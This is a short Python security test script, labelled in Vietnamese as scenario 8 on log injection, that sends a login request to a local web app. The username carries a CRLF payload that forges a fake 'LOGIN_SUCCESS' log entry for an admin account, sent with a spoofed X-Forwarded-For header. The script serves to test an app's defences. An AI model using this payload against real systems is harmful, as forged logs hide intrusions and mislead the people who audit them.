import requests
import subprocess
import sys

BASE_URL = "http://127.0.0.1:8000"

def main():
    print("=============================================================")
    print(" KIỂM THỬ KỊCH BẢN 8: LOG INJECTION (POISONING)")
    print("=============================================================")
    
    print("[*] Đang tự động reset dữ liệu mẫu và mở khóa tài khoản...")
    subprocess.run([sys.executable, "create_accounts.py"], capture_output=True)
    
    log_injection_payload = "hacker_user\r\n2026-06-11 15:30:00 | WARNING | LOGIN_SUCCESS | IP=8.8.8.8 | user=admin_test | Fake logged in!"
    print(f"Tiêm nhiễm log sử dụng CRLF: {repr(log_injection_payload)}")
    headers = {"X-Forwarded-For": "192.168.8.1"}
    res = requests.post(f"{BASE_URL}/login", data={"username": log_injection_payload, "password": "WrongPassword"}, headers=headers)
    print(f"  Response: HTTP Code = {res.status_code}, Response = {res.json()}")

if __name__ == "__main__":
    main()
